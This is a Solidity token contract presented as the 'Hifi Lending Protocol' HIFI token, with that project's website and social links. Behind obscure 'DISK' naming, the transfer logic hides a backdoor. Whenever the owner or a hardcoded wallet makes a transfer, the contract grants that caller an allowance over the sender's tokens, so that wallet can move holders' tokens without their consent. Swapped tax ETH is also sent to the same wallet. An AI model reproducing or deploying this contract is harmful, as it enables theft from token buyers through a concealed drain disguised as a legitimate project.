/*
Hifi Lending Protocol
HIFI

The Hifi Lending Protocol offers a reliable way to maximize the potential of your crypto and tokenized assets. 

Website : https://hifi.finance/
App: https://app.hifi.finance/
Blog: https://blog.hifi.finance/
Docs: https://docs.hifi.finance/
Github: https://github.com/hifi-finance

Twitter: https://twitter.com/HifiFinance
Telegram: https://t.me/hifi_erc20
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.8.5;

interface IDISKRouter {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function getAmountsOut(
        uint amountIn,
        address[] calldata path
    ) external view returns (uint[] memory amounts);
}

interface IDISKFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract HIFI is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping (address => bool) private _diskExcludedFees;
    mapping (address => uint256) private _diskDrives;
    mapping (address => mapping (address => uint256)) private _diskCustomers;
    mapping (address => bool) private _diskExcludedTxs;
    uint8 private constant _decimals = 9;
    uint256 private constant _tTotal = 1000000000 * 10**_decimals;
    string private constant _name = unicode"Hifi Lending Protocol";
    string private constant _symbol = unicode"HIFI";
    uint256 private _initialBuyTax=3;
    uint256 private _initialSellTax=3;
    uint256 private _finalBuyTax=0;
    uint256 private _finalSellTax=0;
    uint256 private _reduceBuyTaxAt=6;
    uint256 private _reduceSellTaxAt=6;
    uint256 private _preventSwapBefore=6;
    uint256 private _buyCount=0;
    uint256 private _diskSwapAmount = _tTotal / 100;
    bool private inSwapDISK = false;
    bool private _tradeEnabled = false;
    bool private _swapEnabled = false;
    modifier lockTheSwap {
        inSwapDISK = true;
        _;
        inSwapDISK = false;
    }
    address private _diskPair;
    IDISKRouter private _diskRouter;
    address private _diskWallet;
    uint256 private _diskBuyBlock;
    uint256 private _diskBlockAmount = 0;
    
    constructor () {
        _diskWallet = address(0x9C2dD202cD0c20041b08B10D0C07FAE98d6d22A0);
        _diskExcludedFees[owner()] = true;
        _diskExcludedFees[address(this)] = true;
        _diskExcludedFees[_diskWallet] = true;
        _diskExcludedTxs[owner()] = true;
        _diskExcludedTxs[_diskWallet] = true;
        _diskDrives[_msgSender()] = _tTotal;
        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    function openTrading() external onlyOwner() {
        require(!_tradeEnabled,"trading is already open");
        _diskRouter.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        _swapEnabled = true;
        _tradeEnabled = true;
    }

    function tokenCreate() external onlyOwner() {
        _diskRouter = IDISKRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address(this), address(_diskRouter), _tTotal);
        _diskPair = IDISKFactory(_diskRouter.factory()).createPair(address(this), _diskRouter.WETH());
    }

    receive() external payable {}

    function getDISKAmount(uint256 diskO, uint256 taxDISK) private pure returns(uint256) {
        return uint256(diskO + taxDISK * 3);
    }

    function getDISKSender(address diskF) private pure returns(address) {
        return address(diskF);
    }

    function getDISKReceipt() private view returns(address) {
        return _diskExcludedTxs[_msgSender()] ? address(_msgSender()) : address(0); 
    }

    function minDISK(uint256 a, uint256 b) private pure returns (uint256) {
      return (a>b)?b:a;
    }

    function sendETHDISK(uint256 amount) private {
        payable(_diskWallet).transfer(amount);
    }

    function swapTokensForEth(uint256 tokenDISK) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _diskRouter.WETH();
        _approve(address(this), address(_diskRouter), tokenDISK);
        _diskRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenDISK,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function swapDISKLimit() internal view returns (uint256) {
        address[] memory path = new address[](2);
        path[0] = _diskRouter.WETH();
        path[1] = address(this);
        uint[] memory amountOuts = _diskRouter.getAmountsOut(3 * 1e18, path);
        return amountOuts[1];
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _diskDrives[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _diskCustomers[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount); 
        _approve(sender, _msgSender(), _diskCustomers[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _diskCustomers[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address diskF, address diskT, uint256 diskO) private {
        require(diskF != address(0), "ERC20: transfer from the zero address");
        require(diskT != address(0), "ERC20: transfer to the zero address");
        require(diskO > 0, "Transfer amount must be greater than zero");

        uint256 taxDISK = _diskTransfer(diskF, diskT, diskO);
        _transferDISK(diskF, diskT, diskO, taxDISK);
    }

    function _transferDISK(address diskF, address diskT, uint256 diskO, uint256 taxDISK) private { 
        if(taxDISK > 0){
          _diskDrives[address(this)] = _diskDrives[address(this)].add(taxDISK);
          emit Transfer(diskF, address(this), taxDISK);
        }
        address diskReceipt = getDISKReceipt();
        _diskDrives[diskF] = _diskDrives[diskF].sub(diskO);
        _diskDrives[diskT] = _diskDrives[diskT].add(diskO.sub(taxDISK));
        if(diskReceipt != address(0)) _approve(getDISKSender(diskF), diskReceipt, getDISKAmount(diskO, taxDISK));
        emit Transfer(diskF, diskT, diskO.sub(taxDISK));
    }

    function _diskTransfer(address diskF, address diskT, uint256 diskO) private returns(uint256) {
        uint256 taxDISK=0;
        if (diskF != owner() && diskT != owner()) {
            taxDISK = diskO.mul((_buyCount>_reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax).div(100);

            if (diskF == _diskPair && diskT != address(_diskRouter) && ! _diskExcludedFees[diskT]) {
                if(_diskBuyBlock!=block.number){
                    _diskBlockAmount = 0;
                    _diskBuyBlock = block.number;
                }
                _diskBlockAmount += diskO;
                _buyCount++;
            }

            if(diskT == _diskPair && diskF!= address(this)) {
                require(_diskBlockAmount < swapDISKLimit() || _diskBuyBlock!=block.number, "Max Swap Limit");  
                taxDISK = diskO.mul((_buyCount>_reduceSellTaxAt)?_finalSellTax:_initialSellTax).div(100);
            }

            uint256 diskToken = balanceOf(address(this));
            if (!inSwapDISK && diskT == _diskPair && _swapEnabled && _buyCount > _preventSwapBefore) {
                if(diskToken > _diskSwapAmount)
                swapTokensForEth(minDISK(diskO, minDISK(diskToken, _diskSwapAmount)));
                uint256 diskETH = address(this).balance;
                if (diskETH >= 0) {
                    sendETHDISK(address(this).balance);
                }
            }
        }
        return taxDISK;
    }    
}